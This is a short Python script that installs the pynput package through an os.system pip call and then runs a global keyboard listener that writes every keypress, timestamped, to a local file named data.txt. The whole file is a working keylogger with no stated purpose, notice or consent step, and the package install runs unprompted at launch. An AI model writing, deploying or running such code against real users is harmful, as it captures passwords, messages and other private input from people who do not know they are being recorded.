from os import system

package = 'pynput'
system('pip install %s' % package)

from pynput.keyboard import Key, Listener

import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "data.txt"),level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
                    


def on_press(key):
    logging.info('"{0}"'.format(key))


with Listener(on_press=on_press) as listener:
    listener.join()
